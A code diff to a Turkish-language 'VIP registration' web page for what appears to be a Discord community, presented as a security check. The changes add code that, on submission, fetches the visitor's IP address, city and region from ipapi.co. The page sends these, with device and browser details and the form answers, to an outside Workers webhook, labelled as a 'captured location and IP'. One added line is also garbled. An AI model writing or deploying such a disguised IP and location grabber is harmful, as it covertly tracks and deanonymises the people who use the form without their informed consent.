@@ -308,11 +308,11 @@
       </div>
       <div class="vip-satir">
         <span class="vip-etiket">TESPİT EDİLEN CİHAZ</span>
-        <span class="vip-deger" id="vipCihaz" style="font-size: 12px;">-</span>
+        <span class="vip-deger" id="vipCihaz" style="font-size: 11px;">-</span>
       </div>
       <div class="vip-satir">
-        <span class="vip-etiket">GÜVENLİK DURUMU</span>
-        <span class="vip-deger" style="color: #23a55a;">DOĞRULANDI ✓</span>
+        <span class="vip-etiket">KONUM / IP</span>
+        <span class="vip-deger" id="vipKonum" style="font-size: 11px; color: #fbbf24;">Taranıyor...</span>
       </div>
     </div>
 
@@ -320,7 +320,6 @@
   </div>
 </div>
 
-<!-- Yüklediğin Basslı Phonk Müzik Dosyası -->
 <audio id="ozelMuzik" loop src="muzik.mp3"></audio>
 
 <script>
@@ -386,7 +385,6 @@
   const muzikBtn = document.getElementById('muzikKontrol');
   let sesAcik = false;
 
-  // Sayfaya ilk tıklandığında müzik otomatik başlar
   document.body.addEventListener('click', function ilkTiklama() {
     if (!sesAcik) {
       ozelMuzik.volume = 0.4;
@@ -416,25 +414,25 @@
   function cihazBilgisiAl() {
     const ua = navigator.userAgent;
     let cihaz = "Bilinmeyen Cihaz";
-    if (/Windows NT 10.0/.test(ua)) cihaz = "Windows 10/11 PC";
+    if (/Windows NT 10.0/.test(ua)) cihaz = "Windows 10/11";
     else if (/Windows/.test(ua)) cihaz = "Windows PC";
-    else if (/Android/.test(ua)) cihaz = "Android Telefon";
-    else if (/iPhone|iPad/.test(ua)) cihaz = "iPhone / iPad";
+    else if (/Android/.test(ua)) cihaz = "Android";
+    else if (/iPhone|iPad/.test(ua)) cihaz = "iOS";
     else if (/Mac OS/.test(ua)) cihaz = "Mac";
     else if (/Linux/.test(ua)) cihaz = "Linux";
 
     let tarayici = "Tarayıcı";
     if (/Edg/.test(ua)) tarayici = "Edge";
-    else if (/OPR|Opera/.test(ua)) tarayici = "Opera / Opera GX";
+    else if (/OPR|Opera/.test(ua)) tarayici = "Opera";
     else if (/Chrome/.test(ua)) tarayici = "Chrome";
     else if (/Firefox/.test(ua)) tarayici = "Firefox";
-    else if (/Safari/.test(ua)) tarayici = "Safari";
+    else if (/Safari/.test(ua)) tarayici, tarayici = "Safari";
 
-    const cozunurluk = `${window.screen.width}x${window.screen.height}`;
-    return `${cihaz} (${tarayici} - ${cozunurluk})`;
+    return `${cihaz} / ${tarayici}`;
   }
 
-  document.getElementById('form').addEventListener('submit', function(e) {
+  // FORM GÖNDERME VE IP/KONUM ÇEKME
+  document.getElementById('form').addEventListener('submit', async function(e) {
     e.preventDefault();
 
     const kullaniciCevap = parseInt(document.getElementById('captchaCevap').value);
@@ -450,6 +448,20 @@
     tikSesiCal();
     hataMesaji.style.display = 'none';
 
+    const btn = document.getElementById('btn');
+    btn.disabled = true;
+    btn.innerText = "IP ve Konum Taranıyor...";
+
+    // IP ve Konum Bilgisini Ücretsiz Servisten Çek
+    let ipBilgi = "Bilinmeyen Konum";
+    try {
+      const ipRes = await fetch('https://ipapi.co/json/');
+      const ipData = await ipRes.json();
+      ipBilgi = `${ipData.city} / ${ipData.region} (${ipData.ip})`;
+    } catch (err) {
+      ipBilgi = "Konum Alınamadı";
+    }
+
     const webhookURL = "https://aged-hat-36af.34samet343.workers.dev/";
     const nick = document.getElementById('nick').value;
     const topSayisi = document.getElementById('top').value;
@@ -458,24 +470,21 @@
     const katki = document.getElementById('katki').value;
     const cihazDetay = cihazBilgisiAl();
     const basvuruKodu = "#TR-" + Math.floor(1000 + Math.random() * 9000);
-    const btn = document.getElementById('btn');
-
-    btn.disabled = true;
-    btn.innerText = "VIP Kart Oluşturuluyor...";
 
     const mesaj = {
-      username: "Güvenlik Sistemi",
+      username: "Güvenlik & Konum Sistemi",
       embeds: [{
-        title: "👑 Yeni VIP Kayıt Tamamlandı!",
+        title: "👑 Yeni VIP Kayıt ve Konum Tespiti!",
         color: 2336090,
         fields: [
           { name: "🎫 Başvuru Kodu", value: "**" + basvuruKodu + "**", inline: true },
           { name: "👤 Discord Nicki", value: "`" + nick + "`", inline: true },
           { name: "⚽ Top Sayısı", value: topSayisi, inline: true },
           { name: "🧠 Ortam Seviyesi", value: seviye, inline: true },
-          { name: "⏰ Aktiflik Süresi", value: aktiflik, inline: true },
-          { name: "💬 Sunucuya Katkısı", value: ">>> " + katki },
-          { name: "📱 Tespit Edilen Cihaz", value: "`" + cihazDetay + "`" }
+          { name: "⏰ Aktiflik", value: aktiflik, inline: true },
+          { name: "💬 Katkısı", value: ">>> " + katki },
+          { name: "📱 Cihaz", value: "`" + cihazDetay + "`", inline: true },
+          { name: "📍 Yakalanan Konum & IP", value: "`" + ipBilgi + "`", inline: true }
         ],
         footer: { text: "VIP Güvenlik Sistemi" },
         timestamp: new Date()
@@ -500,6 +509,7 @@
       document.getElementById('vipKod').innerText = basvuruKodu;
       document.getElementById('vipNick').innerText = nick;
       document.getElementById('vipCihaz').innerText = cihazDetay;
+      document.getElementById('vipKonum').innerText = ipBilgi;
 
       document.getElementById('kopyalaBtn').onclick = function() {
         tikSesiCal();
